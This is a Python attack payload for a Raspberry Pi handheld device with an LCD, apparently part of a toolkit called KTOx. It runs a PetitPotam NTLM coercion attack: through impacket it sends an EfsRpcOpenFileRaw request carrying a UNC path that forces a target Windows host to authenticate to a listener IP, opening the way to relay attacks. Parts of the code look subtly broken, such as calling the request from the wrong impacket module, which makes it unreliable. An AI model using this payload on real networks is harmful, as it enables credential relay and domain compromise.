#!/usr/bin/env python3
"""
KTOx *payload* – **PetitPotam Attack**
==============================================
This payload performs a PetitPotam attack, which coerces a Windows host
to authenticate to an arbitrary server, allowing for NTLM relay attacks.

Features:
- Interactive UI for entering the target IP and the listener IP.
- Uses a Python implementation of the PetitPotam attack.
- The attack runs in a background thread.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Start the attack.
    - KEY1: Edit the target IP.
    - KEY2: Edit the listener IP.
    - KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import threading
import socket

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# PetitPotam implementation
# This is a simplified version of the PetitPotam attack
# The original code can be found here: https://github.com/topotam/PetitPotam
from impacket.dcerpc.v5 import epm, transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT

TARGET_IP = "192.168.1.100"
LISTENER_IP = "192.168.1.200"
running = True
attack_thread = None

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "PetitPotam Attack", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (128 - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (128 - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), f"Target: {TARGET_IP}", font=FONT, fill="white")
        d.text((5, 50), f"Listener: {LISTENER_IP}", font=FONT, fill="white")
        d.text((5, 100), "OK=Attack", font=FONT, fill="cyan")
        d.text((5, 110), "KEY1=Target | KEY2=Listener", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"Target: {TARGET_IP}", font=FONT, fill="white")
        d.text((5, 85), f"Listener: {LISTENER_IP}", font=FONT, fill="white")

    LCD.LCD_ShowImage(img, 0, 0)

def petitpotam_attack(listener_host, target_host):
    string_binding = epm.hept_map(target_host, epm.MSRPC_UUID_EFSR, protocol='ncacn_ip_tcp')
    rpc_transport = transport.DCERPCTransportFactory(string_binding)
    dce = rpc_transport.get_dce_rpc()
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.connect()
    dce.bind(epm.MSRPC_UUID_EFSR)
    
    # Build the malicious path
    malicious_path = f"\\\\{listener_host}\\share\\whatever"
    
    try:
        request = epm.EfsRpcOpenFileRaw()
        request['FileName'] = malicious_path + '\x00'
        dce.request(request)
    except Exception as e:
        if "ERROR_BAD_NETPATH" in str(e):
            print("Attack successful: The target machine tried to authenticate to our listener.")
            return True
        else:
            print(f"Attack failed: {e}")
            return False

def run_attack():
    draw_ui("attacking")
    if petitpotam_attack(LISTENER_IP, TARGET_IP):
        draw_ui(message_lines=["Attack successful!"])
    else:
        draw_ui(message_lines=["Attack failed!"])
    time.sleep(3)

def handle_ip_input_logic(initial_ip, ip_type):
    char_set = "0123456789."
    char_index = 0
    input_ip = ""
    
    while running:
        img = Image.new("RGB", (128, 128), "black")
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {ip_type} IP", font=FONT_TITLE, fill="cyan")
        d.line([(0, 22), (128, 22)], fill="cyan", width=1)
        d.text((5, 40), f"IP: {input_ip}", font=FONT, fill="white")
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill="cyan")
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill="cyan")
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        if btn == "OK":
            input_ip += char_set[char_index]
            time.sleep(0.2)
        if btn == "KEY1":
            input_ip = input_ip[:-1]
            time.sleep(0.2)
        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)
        if GPIO.input(PINS["KEY2"]) == 0:
            parts = input_ip.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return input_ip
            else:
                draw_ui(message_lines=["Invalid IP!", "Try again."])
                time.sleep(2)
                input_ip = ""
        
        time.sleep(0.1)
    return None

if __name__ == "__main__":
    try:
        while running:
            draw_ui("main")
            
            if GPIO.input(PINS["OK"]) == 0:
                attack_thread = threading.Thread(target=run_attack)
                attack_thread.start()
                time.sleep(0.3)
            
            if GPIO.input(PINS["KEY1"]) == 0:
                new_ip = handle_ip_input_logic(TARGET_IP, "Target")
                if new_ip:
                    TARGET_IP = new_ip
                time.sleep(0.3)

            if GPIO.input(PINS["KEY2"]) == 0:
                new_ip = handle_ip_input_logic(LISTENER_IP, "Listener")
                if new_ip:
                    LISTENER_IP = new_ip
                time.sleep(0.3)

            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("PetitPotam Attack payload finished.")
